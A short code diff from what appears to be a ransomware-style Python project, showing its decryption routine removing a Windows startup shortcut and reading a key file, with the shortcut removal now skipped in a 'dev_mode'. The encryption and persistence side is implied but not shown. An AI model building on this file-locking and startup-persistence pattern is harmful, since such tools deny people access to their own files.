@@ -105,12 +105,13 @@ def decrypt_directory(directory_path, key):
 def main():
     start_decryption()
     startup = winshell.startup()
-    shortcut_path = os.path.join(startup, "OpenFileAtStartup.lnk")
-    if os.path.exists(shortcut_path):
-        try:
-            os.remove(shortcut_path)
-        except:
-            pass
+    if not dev_mode:
+        shortcut_path = os.path.join(startup, "OpenFileAtStartup.lnk")
+        if os.path.exists(shortcut_path):
+            try:
+                os.remove(shortcut_path)
+            except:
+                pass
     key_path = os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256")
     if os.path.exists(key_path):
         try:
